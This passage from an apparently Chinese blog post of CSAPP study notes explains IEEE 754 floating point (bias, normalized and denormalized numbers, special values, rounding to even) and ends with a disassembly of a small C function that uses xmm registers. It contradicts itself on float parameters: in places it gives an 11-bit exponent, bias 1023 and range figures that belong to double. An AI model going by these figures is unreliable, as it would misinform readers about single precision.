\]</span> 小数点每左移一位,<span
class="math inline">\(10\)</span>的指数就得增加1.</p>
<p>小学时学的科技法的规范形式,小数点左侧只能留下一个非零位,就比如: <span
class="math display">\[
123.456=1.23456\times 10^2
\]</span></p>
<p><strong>为啥要发明科学计数法呢?</strong>举个例子</p>
<p>如果要表示两个整亿,不用科计法为<span
class="math inline">\(2&#39;000&#39;000&#39;000\)</span>,表示这个数就用了10个十进制位,而其中后面9位都是0,包含了重复信息.</p>
<p>而如果用科技法表示为<span class="math inline">\(2\times
10^9\)</span></p>
<p>此时我们只需要保留两个信息,底数<span
class="math inline">\(2\)</span>和指数<span
class="math inline">\(9\)</span>,只用了两位</p>
<p>要是不是两个整亿呢?要是<span
class="math inline">\(2&#39;987&#39;654&#39;321\)</span>呢?</p>
<p>此时如果要求保留全精度,科技法表示为<span
class="math inline">\(2.987654321\times
10^9\)</span>,相对于普通表示,需要多保存一个9</p>
<p>但是如果要求保留一位有效数字,科技法就可以表示为<span
class="math inline">\(3\times 10^9\)</span>,普通方法还得带着一伙子0</p>
<p>在数字很大的时候,我们往往更加关心量级和最高位,低位的数字相对欠重要,很多情况下要舍入</p>
<h3 id="从科计法到二进制">从科计法到二进制</h3>
<p>不管是普通表示还是科技表示,二进制和10进制只有一个区别,即每一位的权重,</p>
<p>位权从10改成2就是二进制了</p>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605185246553.png"
alt="image-20220605185246553" /> <span class="math display">\[
b=\sum_{i=-n}^m 2^{i}\times b_i
\]</span> 二进制的"科技法"也有一个规范形式,即小数点左侧只能留一个1</p>
<p>比如<span class="math inline">\(5.125(10)=101.001(2)=1.01001\times
2^2(2科技)\)</span></p>
<blockquote>
<p>十进制科技法的规范形式,小数点左侧只能留下一个非0数</p>
<p>为啥二进制不能说留下一个非零数?</p>
<p>二进制下要么是0要么是1,非零数就是1</p>
<p>并且二进制科技法中,小数点左侧只留下一个1,那么这个1就可以省去不表示,只要是所有人都知道这个协议,他们使用这个科技法的二进制数的时候就会自己添上最前面的1.这样又可以腾出一位来用于精度信息</p>
<p>为什么十进制不能省去小数点左侧的数?因为这个数可能是1~9这9个数任意一个.省去就丢失了信息.二进制科技法中可以省去,是因为小数点左侧一定是1</p>
</blockquote>
<h2 id="ieee754标准">IEEE754标准</h2>
<h3 id="浮点数的手写表示法">浮点数的手写表示法</h3>
<p>IEEE754标准中将一个浮点数表示成这样 <span class="math display">\[
V=(-1)^s\times M\times 2^E
\]</span></p>
<blockquote>
<p>s,符号.s=1则系数-1;s=0则系数1</p>
<p>M,尾数,一个二进制小数,其取值范围有两种</p>
<p><span class="math inline">\(M\in[1,2)\)</span>,规格化数</p>
<p><span class="math inline">\(M\in [0,1)\)</span>,非规格化数</p>
<p>E,指数</p>
</blockquote>
<p>注意这里只是说"表示",真的在计算机中编码实现时不是这样的</p>
<p>真到编码的时候咋编的呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605190631176.png"
alt="image-20220605190631176" />
<figcaption aria-hidden="true">image-20220605190631176</figcaption>
</figure>
<p>左边是高位,右边是低位</p>
<p>最高位是符号位,这和刚才的表示是相同的</p>
<p>然后<code>exp</code>是"阶码".对于32位的float类型,<code>exp</code>占用8位,对于64位的double类型,<code>exp</code>占用11位.</p>
<p>用k表示exp的位数,对于float来说,k=11</p>
<blockquote>
<p>注意这里"阶码"是加了引号的,因为实际存储的时候,这里面存放的不是刚才的表示中的<span
class="math inline">\(E\)</span>,但是<span
class="math inline">\(E\)</span>是经过一些手续从<span
class="math inline">\(exp\)</span>换算得到的.这个换算过程是有固定套路的,这是后话</p>
</blockquote>
<p>然后是<code>frac</code>尾数M,占用了23位.这尾数和刚才的"表示"中也是不一样的,也需要分类讨论办点手续</p>
<p>用n表示frac的位数,对于float来说n=23</p>
<blockquote>
<p>啥意思呢?举个例子</p>
<p>比如假设一个单精度浮点数float在计算机中的编码为: <span
class="math display">\[
0&#39;0000\ 0001&#39;0000\ 0000\ 0000\ 0000\ 0000\ 001
\]</span></p>
<table>
<thead>
<tr>
<th>符号位s</th>
<th>exp</th>
<th>frac</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0001</td>
<td>0000 0000 0000 0000 0000 001</td>
</tr>
</tbody>
</table>
<p>如果认为<span class="math inline">\(E=0000\
0001,M=1\)</span>去算这个数得到 <span class="math display">\[
b=1\times 2^1=10(2)=2(10)
\]</span> 这就错了,实际上这个数是 <span class="math display">\[
1\frac{1}{2^{23}}\times 2^{-126}
\]</span></p>
<blockquote>
<p>这里<span
class="math inline">\(1\frac{1}{2^{23}}\)</span>是带分数</p>
</blockquote>
<p>为啥会这样呢?为啥不能直来直去,exp就表示E,frac就表示M?</p>
<p>这涉及到排序方便的问题,这是后话.</p>
<p>总之计算机中存储的浮点数直接拿出来并不是s,E,M这样排好的,需要办手续</p>
</blockquote>
<h3 id="浮点数的实际存储状态">浮点数的实际存储状态</h3>
<h4 id="状态设计">状态设计</h4>
<p>在设计浮点数的存储状态时,鳎们首先规定了几个特殊的状态:</p>
<p>1.正负无限大</p>
<p>2.不是数NAN</p>
<blockquote>
<p>给你一个32位数,让你考虑怎么用32个位表示一个数是正负无限大还是不是数还是正常数?</p>
<p>专门用两个状态位标记?比如开头两位,00表示正无限大,01表示负无限大,10表示不是数,11表示正常数.然后剩下30位在正常数时使用?</p>
<p>这样设计有啥意义呢?纯粹是页表状态学傻了,非得用一个标志位标志一下脏不脏是吧?</p>
<p>一个数要是无限大或者根本不是数,那么后面30位不都没有意义了吗?这在数电上就是无关项了.</p>
<p>看看人家IEEE754怎么规定的吧</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605192623246.png"
alt="image-20220605192623246" />
<figcaption aria-hidden="true">image-20220605192623246</figcaption>
</figure>
<blockquote>
<p>只能说这种规定不流失不蒸发零浪费,把牙膏挤的一滴都不剩了.当看不明白这种定义的蜜汁操作时,使劲往空间利用效率上想就对了</p>
</blockquote>
<p>什么个想法呢?</p>
<p>1.符号位站最高位,不管如何符号位总得站一位吧.这里没有异议</p>
<p>2.无穷大,不管是正负,其exp全是1,frac全是0.</p>
<blockquote>
<p>为啥要用exp全1,frac全0表示无穷大?这样表示岂不是会占用正常数的地址空间?</p>
<p>确实会占用,但是只占用了一种状态,exp还剩下<span
class="math inline">\(2^8-1=255\)</span>种状态</p>
<p>像比于专门用两个状态位,这样exp还剩下6位,可以表示<span
class="math inline">\(2^6=64\)</span>种状态</p>
<p>显然人家的规定更会挤牙膏</p>
</blockquote>
<blockquote>
<p>正负无穷大怎么表示的呢?</p>
<p>符号位决定正负,后面的exp全1frac全0表示无穷大</p>
<p>它甚至符号位和正常数都共用</p>
</blockquote>
<p>3.NaN,其和无穷大的表示,就是frac是否全0</p>
<blockquote>
<p>只要CPU读取一个浮点数,发现exp的8位全是1,他就知道要么是一个无穷大,要么不是数.反正不是好东西.</p>
<p>然后再检查后面frac的23位,要是有一个1就判定为NaN</p>
<p>这又挤了牙膏,设计出无穷大之后,NaN随之而来,甚至设计出无穷大之后再设计NaN都不会占用正常数的地址空间了</p>
</blockquote>
<p>4.正常数</p>
<p>正常数分为规格化数和非规格化数</p>
<p>区分两者是通过exp是否全0</p>
<p>至于啥是规格啥是非规格,这是后话,反正实际使用的时候都能用到并且没有显式的开关</p>
<h4 id="规格化数">规格化数</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605193811879.png"
alt="image-20220605193811879" />
<figcaption aria-hidden="true">image-20220605193811879</figcaption>
</figure>
<h4 id="exp">exp</h4>
<p>心里应该时刻悬着一个疑问,exp经过什么手续得到E阶码?</p>
<p>现在给你说这个手续是什么 <span class="math display">\[
E=exp-Bias\\
\]</span> <span class="math display">\[
exp=e_{k-1}e_{k-2}...e_{1}e_{0}\\
\]</span></p>
<p><span class="math display">\[
Bias=2^{k-1}-1
\]</span></p>
<p>其中k是exp占用的二进制位数,</p>
<p>对于float来说,<span
class="math inline">\(k=11,Bias=2^{11-1}-1=1023\)</span></p>
<blockquote>
<p>懵逼了吧,Bias是个銱啊?</p>
<p>给一个定义<span
class="math inline">\(Bias=2^{k-1}-1\)</span>,跟那该死的谜语人儿似的,不给说为啥这样整.</p>
<p>CSAPP上也是春秋笔法,留个后话,和某些人一样吊人胃口</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605194513398.png"
alt="image-20220605194513398" />
<figcaption aria-hidden="true">image-20220605194513398</figcaption>
</figure>
<p>如果想要保持这层神秘感,那就继续看书,总会有一瞬间恍然大悟</p>
<p>如果急于知道原因,可以这样想:</p>
<p>1.我这样算出来的<span
class="math inline">\(E\)</span>,怎么表示正负呢?</p>
<p>虽然我整个数有一个符号s,但是阶码也应该有一个符号啊,<span
class="math inline">\(-1.01\times 2^2\)</span>和<span
class="math inline">\(-1.01\times 2^{-2}\)</span>这两个可不一样啊</p>
<p>按理说E的开头一位应该是符号啊,这样规定,没写符号位啊?</p>
<p>2.<span
class="math inline">\(Bias=2^{k-1}-1\)</span>好大啊,用exp去减Bias不是以卵击石吗?剪完了十有八九是个负数啊?</p>
<p>这样想就在向Bias的设计目的靠拢了</p>
<p>先解决2.</p>
<p>对于float,k=11 <span class="math display">\[
Bias=2^{11-1}-1=2^{10}-1=0111\ 1111\ 111\
\]</span> 最高位竟然是0,剩下低位全是1</p>
<p>也就是说当<span class="math inline">\(exp=1XXX\ XXXX\
XXX\)</span>,这时候<span
class="math inline">\(exp-Bias\)</span>得到的是正数</p>
<p>而<span class="math inline">\(exp\)</span>要么表示是<span
class="math inline">\(1XXX\ XXXX\ XXX\)</span>,要么是<span
class="math inline">\(0XXX\ XXXX\ XXX\)</span></p>
<p>这两种情况平分秋色,就算是摇色子也是对半的几率落在两个范围内.</p>
<p>而我们希望阶码的正负数范围也是平分秋色,势均力敌的(差一两个无所谓)</p>
<p>现在就有雏形了</p>
<p>当<span class="math inline">\(exp=1XXX\ XXXX\ XXX\)</span>,<span
class="math inline">\(E=exp-Bias\)</span>得到的就是正数</p>
<p>当<span class="math inline">\(exp=0XXX\ XXXX\ XXX\)</span>,<span
class="math inline">\(E=exp-Bias\)</span>得到的就是负数</p>
<p>这好像和我们平常定义的正负数有出入啊?</p>
<p>通常都是0表示正数,1表示负数啊?这里为啥要倒过来exp最高位为1时表示正数,exp最高位为0时表示负数</p>
<p>这时候就要考虑方便排序比大小了</p>
<p>两个阶码<span class="math inline">\(E1,E2\)</span>都是经过<span
class="math inline">\(exp1,exp2\)</span>减同一个数得到的,那么<span
class="math inline">\(E1&gt;E2\)</span>则<span
class="math inline">\(exp1&gt;exp2\)</span></p>
<p>反过来也是这样,如果<span
class="math inline">\(exp1&gt;exp2\)</span>则<span
class="math inline">\(E1&gt;E2\)</span></p>
<p>如果正数最高位为1负数最高位为0,那么很自然的<span
class="math inline">\(1&gt;0\)</span>,正数大于负数.</p>
<p>两个同号的exp比较时就从最高位遍历到最低位一视同仁</p>
<p>那么任意两个exp比较只需要从最高位遍历到最低位,谁的高位有1谁大</p>
<p>这样比较大小顺理成章,不用特判符号位</p>
<p>总结:</p>
<p>Bias这样设计考虑了排序方便,并且减去的这个数正好是区间的一半,相当于<span
class="math inline">\([0,10]-5\Rightarrow[-5,5]\)</span>,使得正负数平分秋色.</p>
<p>解决了正负号问题同时附带着解决了大小问题,岂不美哉</p>
</blockquote>
<h4 id="frac">frac</h4>
<p>前面说过,从frac到真正的尾数M也需要分类讨论办手续</p>
<p>现在就是分类讨论情况1</p>
<p>当exp不全为0也不全为1(即表示一个规格化数时) <span
class="math display">\[
M=1+frac=1.f_{n-1}f_{n-2}...f_0
\]</span> 即存储时自动忽略了小数点左边的1,计算式要加上</p>
<h5 id="总结">总结</h5>
<p>现在我们知道了exp到E的手续还有frac到M的手续,符号s没有手续.</p>
<p>手续齐全了,一个规格化数的表示和存储的关系我们也就明了了</p>
<p>还是以一开始举的例子,假设一个float的存储是这样的 <span
class="math display">\[
0&#39;0000\ 0001&#39;0000\ 0000\ 0000\ 0000\ 0000\ 001
\]</span></p>
<table>
<thead>
<tr>
<th>符号s</th>
<th>exp</th>
<th>frac</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0001</td>
<td>0000 0000 0000 0000 0000 001</td>
</tr>
</tbody>
</table>
<p><span class="math inline">\(Bias=0111\ 1111(2)=127(10)\)</span></p>
<p><span class="math inline">\(E=exp=Bias=1-127=-126(10)\)</span></p>
<p><span class="math inline">\(M=1+frac=1.0000\ 0000\ 0000\ 0000\ 0000\
001(2)=1+2^{-23}(10)\)</span> <span class="math display">\[
\begin{aligned}
b&amp;=(-1)^s\times M\times 2^E\\
&amp;=(-1)^0\times(1+2^{-23})\times 2^{-126}\\
&amp;=1\frac{1}{2^{23}}\times 2^{-126}
\end{aligned}
\]</span></p>
<h5 id="范围">范围</h5>
<p>考虑一个exp有k位,frac有n位的规格化数能够表示的数的范围</p>
<p>首先考虑<span
class="math inline">\(exp\)</span>的范围,由于其不能全为0或者全为1,因此有<span
class="math inline">\(exp\in[00...001]\)</span> <span
class="math display">\[
exp\in[\begin{matrix}\underbrace{000\cdots
0001}\\k-1个0,1个1\end{matrix},\begin{matrix}\underbrace{111\cdots
1110}\\k-1个1,1个0\end{matrix}]
\]</span> 即<span class="math inline">\(exp\in[1,2^{k}-2]\)</span></p>
<p>那么<span class="math inline">\(E=exp-Bias=exp-(2^{k-1}-1)\in
[2-2^{k-1},2^{k-1}-1]\)</span></p>
<p><span
class="math inline">\(frac\in[0,\sum_{i=-1}^{-n}2^i]=[0,1-2^{-n}]\)</span></p>
<p><span class="math inline">\(M=1+frac\in[1,2-2^{-n}]\)</span></p>
<table>
<colgroup>
<col style="width: 27%" />
<col style="width: 49%" />
<col style="width: 23%" />
</colgroup>
<thead>
<tr>
<th>符号</th>
<th>最大值</th>
<th>最小值</th>
</tr>
</thead>
<tbody>
<tr>
<td>exp</td>
<td><span class="math inline">\(2^k-2\)</span></td>
<td>1</td>
</tr>
<tr>
<td>E</td>
<td><span class="math inline">\(2^{k-1}-1\)</span></td>
<td><span class="math inline">\(2-2^{k-1}\)</span></td>
</tr>
<tr>
<td>frac</td>
<td><span class="math inline">\(1-2^{-n}\)</span></td>
<td>0</td>
</tr>
<tr>
<td>M</td>
<td><span class="math inline">\(2-2^{-n}\)</span></td>
<td>1</td>
</tr>
<tr>
<td>规格化数<strong>绝对值</strong></td>
<td><span class="math inline">\((2-2^{-n})\times
2^{2^{k-1}-1}\)</span></td>
<td><span class="math inline">\(2^{2-2^{k-1}}\)</span></td>
</tr>
</tbody>
</table>
<p>比如对于float类型,k=11,n=23</p>
<table>
<colgroup>
<col style="width: 17%" />
<col style="width: 57%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr>
<th>符号</th>
<th>最大值</th>
<th>最小值</th>
</tr>
</thead>
<tbody>
<tr>
<td>exp</td>
<td><span class="math inline">\(2^{11}-2=2046\)</span></td>
<td>1</td>
</tr>
<tr>
<td>E</td>
<td><span class="math inline">\(2^{11-1}-1=1023\)</span></td>
<td><span class="math inline">\(2-2^{11-1}=-1022\)</span></td>
</tr>
<tr>
<td>frac</td>
<td><span class="math inline">\(1-2^{-n}=1-2^{-23}\)</span></td>
<td>0</td>
</tr>
<tr>
<td>M</td>
<td><span class="math inline">\(2-2^{-n}=2-2^{-23}\)</span></td>
<td>1</td>
</tr>
<tr>
<td>规格化数<strong>绝对值</strong></td>
<td><span class="math inline">\((2-2^{-23})\times
2^{2^{10}-1}=(2-2^{-23})\times 2^{1023}\)</span></td>
<td><span class="math inline">\(2^{2-2^{11-1}}=2^{-1022}\)</span></td>
</tr>
</tbody>
</table>
<h4 id="非规格化数">非规格化数</h4>
<p>非规格化数是干啥用的呢?都叫他"非规格化"了,看来不规范,为啥还要用它呢?</p>
<p>现在要存储一个值为0的float.而规格化时我们要求<span
class="math inline">\(M\)</span>左边是1,存储的时候省去</p>
<p>对于0,打死也找不到一个1放在小数点左边啊</p>
<h5 id="exp-1">exp</h5>
<p>当exp全0时,存储的数就是一个非规格化数</p>
<p>这时求<span class="math inline">\(E\)</span>的手续又有变化<span
class="math inline">\(E=1-Bias\)</span></p>
<p><span class="math inline">\(Bias=2^{k-1}-1\)</span>不变</p>
<h5 id="frac-1">frac</h5>
<p>求尾数M的手续也有变化<span
class="math inline">\(M=frac\)</span>,没有隐含的1了</p>
<h5 id="总结-1">总结</h5>
<p>如果一个非规格化数的存储是这样的: <span class="math display">\[
0&#39;0000\ 0000&#39;0000\ 0000\ 0000\ 0000\ 0000\ 000
\]</span> 全是0</p>
<p><span class="math inline">\(E=1-Bias=1-127=-126\)</span></p>
<p><span class="math inline">\(M=frac=0\)</span> <span
class="math display">\[
b=(-1)^0\times 0\times 2^{-126}=0
\]</span></p>
<p>同理,如果只有符号位为1,由于M为0,我们也可以得到0</p>
<p>这两个0有区别,符号位0的为+0,符号位1的为-0.两者在计算<span
class="math inline">\(1/+0,1/-0\)</span>时分别得到正负无穷大</p>
<h5 id="范围-1">范围</h5>
<p><span class="math inline">\(M=frac\in[0,1-2^{-n}]\)</span></p>
<p><span class="math inline">\(E=1-Bias=2-2^{k-1}\)</span></p>
<p>阶是不变的,只有尾数<span class="math inline">\(M\)</span>可以变</p>
<blockquote>
<p>到此仍然体会不到非规格化数的作用,仍然懵逼的很.不能就因为要表示0就单开一种类型吧?</p>
<p>这么说吧,非规格化数还可以表示距离0很近的数.啥意思呢?</p>
<p>注意非规格化数的阶码<span
class="math inline">\(E=2-2^{k-1}\)</span>这个定值正好是<strong>规格化数阶码</strong>的最小值</p>
<p>再看尾数,规格化数的尾数最小是1,但是非规格化的尾数<span
class="math inline">\(M\in[0,1-2^{-n}]\)</span>永远小于1</p>
<p>规格化数最靠近0的数为<span
class="math inline">\(2^{2-2^{k-1}}\)</span>,不能再小了,但是非规格化数可以再通过改变尾数更接近0</p>
<p>即同为正数的 规格化数 一定大于 非规格化数</p>
<p>画在数轴上就是CSAPP给出的这幅图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605210411034.png"
alt="image-20220605210411034" />
<figcaption aria-hidden="true">image-20220605210411034</figcaption>
</figure>
<p>这里"偏置量"就是bias</p>
</blockquote>
<h3 id="以八位浮点数为例">以八位浮点数为例</h3>
<p><img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605210629786.png" /></p>
<p>这个表上可以发现很多问题</p>
<h4
id="非规格化数呈现等差数列相邻两项相差frac1512这是为什么">1.非规格化数呈现等差数列,相邻两项相差<span
class="math inline">\(\frac{1}{512}\)</span>,这是为什么?</h4>
<p>非规格化数的阶码是固定的,用<span
class="math inline">\(C=2^{2-2^{k-1}}=2^{-6}=\frac{1}{64}\)</span>表示固定的权</p>
<p>尾数<span class="math inline">\(M\)</span>从<span
class="math inline">\(0\)</span>逐次增加<span
class="math inline">\(\frac{1}{8}\)</span>,那么非规格化数序列就是<span
class="math inline">\(0C,\frac{1}{8}C,\frac{2}{8}C...\frac{7}{8}C\)</span></p>
<p>任意相邻两项差均为<span
class="math inline">\(\frac{1}{8}C\)</span>为定值</p>
<h4
id="从最大的非规格化数到最小的规格化数貌似仍然维持了非规格化数的公差那么规格化数也是等差数列吗">2.从最大的非规格化数到最小的规格化数貌似仍然维持了非规格化数的公差,那么规格化数也是等差数列吗?</h4>
<p>不是</p>
<p>相邻两个规格化数的增长,既要考虑阶码的增长的可能,又要考虑尾数增长的可能</p>
<p>对于一个固定的阶码,尾数只有<span
class="math inline">\(0,\frac{1}{8},...,\frac{7}{8}\)</span>这8种情况,同一个阶码下的这八项组成等差数列</p>
<p>但是换一个阶码,和刚才的尾数就组不成等差数列了,<span
class="math inline">\(\frac{1}{8}C_1\)</span>和<span
class="math inline">\(\frac{1}{8}C_2\)</span>不一样大</p>
<p>因此规格化数随着阶码增大,在数轴上的距离将会离得越来越远</p>
<h4
id="阶码最小的规格化数一定可以和非规格化数平滑过渡吗">3.阶码最小的规格化数一定可以和非规格化数"平滑过渡"吗</h4>
<p>是的</p>
<p>阶码最小时<span class="math inline">\(exp=1\)</span></p>
<p>此时<span
class="math inline">\(exp-Bias=1-Bias\)</span>即阶码最小的规格化数和非规格化数的阶码是相同的</p>
<p>两种数的区别在于尾数前面是否有隐含的1</p>
<p>而非规格化数恰好从0增长到1之前缺一个单元,阶码最小的规格化数尾数恰好从1开始增长,接了非规格化数的班</p>
<p>我们的上述2.3两点在CSAPP给出的插图2-34中得到了验证</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605212121233.png"
alt="image-20220605212121233" />
<figcaption aria-hidden="true">image-20220605212121233</figcaption>
</figure>
<p>a)中约靠近中心,规格化数之间的距离越近(单调不增),越靠近两头规格化数之间的距离越远(单调不减).</p>
<p>一定范围内规格化数距离相同,是因为该几个规格化数的阶码相同,只有尾数不同</p>
<p>b)中最小的规格化数和非规格化数呈等差数列</p>
<h3 id="舍入问题">舍入问题</h3>
<p>向偶数舍入:</p>
<blockquote>
<p>不是四舍五入,不是向上向下舍入</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605213150852.png"
alt="image-20220605213150852" />
<figcaption aria-hidden="true">image-20220605213150852</figcaption>
</figure>
<p>在类型转换从浮点数到整数时还是使用向0舍入</p>
<p>向偶舍入是一个浮点数表示不开的时候采用的方法</p>
<h2 id="x86-64上浮点数的机器级表示">x86-64上浮点数的机器级表示</h2>
<h3 id="个媒体寄存器">16个媒体寄存器</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220605215315252.png"
alt="image-20220605215315252" />
<figcaption aria-hidden="true">image-20220605215315252</figcaption>
</figure>
<p>这里媒体寄存器都长的出奇,最短的用法是128位的xmm寄存器</p>
<p>然而一个浮点类型,要么是32位的float,要么是64位的double,</p>
<p>既然常用类型最长64位,为啥要整128甚至256位的寄存器呢?</p>
<blockquote>
<p>目前猜测这些寄存器不光有存放浮点类型的作用</p>
<p>否则不会叫做"媒体"寄存器,怎么不改名浮点寄存器</p>
<p>实际上看了后面确实如此,xmm,ymm寄存器可以一次性存放好几个值</p>
<p><span
class="math inline">\([x_1,x_2,x_3,x_4]\)</span>这种向量,其中每一个x都是一个float,合起来一共128位刚好占用一共xmm寄存器.</p>
<p>如果是四个double组成的向量则恰好一个ymm寄存器</p>
</blockquote>
<h3 id="汇编指令">汇编指令</h3>
<h4 id="标量指令">标量指令</h4>
<p>为了理解"标量"这个概念,必须得和"向量"这个概念联系对比</p>
<p>当然这里的向量和标量不是数学物理上的概念</p>
<p>更像是概率论与数理童祭时学的概念</p>
<p>X是一个样本,<span class="math inline">\(X_i\)</span>是样本成员 <span
class="math display">\[
X=[X_1,X_2,X_3,...,X_n]
\]</span> 这里<span
class="math inline">\(X\)</span>就是一个向量,他是有一群标量<span
class="math inline">\(X_1,X_2,...,X_n\)</span>按照顺序组成的集合</p>
<p>又比如一个有着横纵坐标的二维几何点就可以叫做一个"向量"<span
class="math inline">\(P(X,Y)\)</span></p>
<p>标量就是一个数据</p>
<p>而向量是一组数据</p>
<p><strong>标量指令</strong>对单个数据进行操作,一条标量指令只涉及一个数据的传递等操作</p>
<p>而<strong>向量指令</strong>可以一条指令完成对多个数据的操作</p>
<p>在接触浮点数的机器表示时,我们没有见过"向量指令"这个说法,是因为之前一直都是标量指令,不涉及向量的概念,当时CSAPP没有必要引入一个概念吓唬初学者</p>
<p><strong>引用内存的指令是标量指令</strong></p>
<p>也就是从寄存器到内存或者从内存到寄存器,只能一次搬一个数据,不能搬多了</p>
<p>那么可以推测,有这么一些指令,可以在xmm寄存器之间一口气搬好几个数据</p>
<h4 id="浮点传送指令">浮点传送指令</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220606145220374.png"
alt="image-20220606145220374" />
<figcaption aria-hidden="true">image-20220606145220374</figcaption>
</figure>
<p><code>main.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">float</span> a=<span class="number">12</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">float</span> b=a;<span class="comment">//使用register修饰提醒编译器使用寄存器存放a变量,但是实际上编译器很可能忽略</span></span><br><span class="line">    <span class="type">float</span> c=a;</span><br><span class="line">    <span class="type">float</span> *d=&amp;c;</span><br><span class="line">    <span class="type">float</span> e=*d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ gcc main.c -O0 -o main</span><br><span class="line"></span><br><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/desktop/float]</span><br><span class="line">└─$ objdump main -d &gt; main.asm</span><br></pre></td></tr></table></figure>
<p><code>main.asm</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0000000000001129 &lt;func&gt;:</span><br><span class="line">    1129:	55                   	push   %rbp</span><br><span class="line">    112a:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">    112d:	f3 0f 10 0d cf 0e 00 	movss  0xecf(%rip),%xmm1        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1134:	00 </span><br><span class="line">    1135:	f3 0f 11 4d f0       	movss  %xmm1,-0x10(%rbp)</span><br><span class="line">    113a:	48 8d 45 f0          	lea    -0x10(%rbp),%rax</span><br><span class="line">    113e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">    1142:	48 8b 45 f8          	mov    -0x8(%rbp),%rax</span><br><span class="line">    1146:	f3 0f 10 00          	movss  (%rax),%xmm0</span><br><span class="line">    114a:	f3 0f 11 45 f4       	movss  %xmm0,-0xc(%rbp)</span><br><span class="line">    114f:	90                   	nop</span><br><span class="line">    1150:	5d                   	pop    %rbp</span><br><span class="line">    1151:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>这里面<code>a,b,c,d,e</code>分别以什么形式存储呢?这得联系上下文了</p>
<p><code>movss  0xecf(%rip),%xmm1</code>从内存rodata区到寄存器使用了<code>movss</code>指令,对应<code>register float a=12;</code>,即a存放在xmm1中</p>
<p><code>movss  %xmm1,-0x10(%rbp)</code>从寄存器到内存栈区使用了<code>movss</code>指令,</p>
<p>可能对应<code>register float b=a;</code>,因为编译器有可能忽略register修饰,也可能对应<code>float c=a;</code></p>
<p>怎么区分这两种情况呢?源代码下文中有对c的地址引用,因此后面如果有对<code>-0x10(%rbp)</code>的地址引用操作,
那么可以判定为c</p>
<p><code>lea    -0x10(%rbp),%rax</code>,rax中存放刚才搬进栈区的局部变量的地址</p>
<p><code>mov    %rax,-0x8(%rbp)</code>这个地址通过rax中转放到栈上,这一步明显对应<code>float *d=&amp;c;</code>,</p>
<p>那么可以推出,d放在栈区<code>-0x8(%rbp)</code>,c放在栈区<code>-0x10(%rbp)</code></p>
<p><code>mov    -0x8(%rbp),%rax</code>这步实际上没有作用,rax之前就是存的<code>-0x8(%rbp)</code>,只不过<code>-O0</code>优化显得编译器根傻子一样</p>
<p><code>movss  (%rax),%xmm0</code>,<code>*d</code>放到寄存器xmm0里,</p>
<p><code>movss  %xmm0,-0xc(%rbp)</code>
<code>*d</code>通过xmm0中转了一下又放到栈区</p>
<p>显然对应<code>float e=*d;</code>,<code>e</code>放在了栈区<code>-0xc(%rbp)</code></p>
<p>见鬼的是<code>register float b=a;</code>这句好像没有起作用.为了保证我们没有出现幻觉,源代码中去掉这一句重新编译然后反编译<br />
</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">float</span> a=<span class="number">12</span>;</span><br><span class="line">    <span class="comment">// register float b=a;</span></span><br><span class="line">    <span class="type">float</span> c=a;</span><br><span class="line">    <span class="type">float</span> *d=&amp;c;</span><br><span class="line">    <span class="type">float</span> e=*d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 